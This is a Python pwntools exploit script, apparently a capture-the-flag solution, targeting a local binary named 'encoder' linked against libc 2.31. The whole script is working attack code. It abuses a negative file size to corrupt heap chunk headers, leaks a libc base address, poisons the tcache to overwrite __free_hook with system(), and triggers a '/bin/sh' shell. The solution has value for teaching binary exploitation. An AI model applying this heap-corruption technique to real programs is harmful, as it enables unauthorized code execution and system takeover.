from pwn import *
#context.log_level='debug'

def upload(index,size,content):
	r.recvuntil(b">>\n")
	r.sendline(b"1")
	r.recvuntil(b"FileIdx: ")
	r.send(str(index))
	r.recvuntil(b"FileSize:")
	r.send(str(size))
	r.recvuntil(b"FileData: ")
	r.send(content)
	return
def download(index):
	r.recvuntil(b">>\n")
	r.sendline(b"2")
	r.recvuntil(b"FileIdx: ")
	r.send(str(index))
	r.recvuntil(b"FileData: ")
	return
def release(index):
	r.recvuntil(b">>\n")
	r.sendline(b"5")
	r.recvuntil(b"FileIdx: ")
	r.send(str(index))
	return

r=process("./encoder")
libc=ELF("./libc-2.31.so")
#gdb.attach(r)

pause()

upload(0,0x20,b'a'*0x20)
upload(1,0x30,b'b'*0x30)
upload(2,0x500,b'c'*0x500)
upload(3,0x20,b'a'*0x20)

upload(0,-1,b'')
upload(0,0x30,b'a'*0x20+p64(0)+p64(0x61))

release(1)
upload(1,0x50,b'a'*0x30+p64(0)+p64(0x511)+b'a'*0x10)
release(2)
download(1)
r.recv(0x40)
libc_base=u64(r.recv(8))-0x1ECBE0
print(hex(libc_base))

upload(0,0x30,b'a'*0x20+p64(0)+p64(0x41))
upload(10,0x30,b"a"*0x30)
release(10)
release(1)

upload(0,-1,b'')
upload(0,0x38,b'a'*0x20+p64(0)+p64(0x41)+p64(libc_base+libc.sym["__free_hook"]))
upload(1,0x30,b'b'*0x30)

upload(4,0x30,p64(libc_base+libc.sym["system"])+b"\x00"*0x28)
upload(5,0x20,b"/bin/sh\x00"+b"\x00"*0x18)
release(5)


print(hex(libc_base+libc.sym["__free_hook"]))
r.interactive()
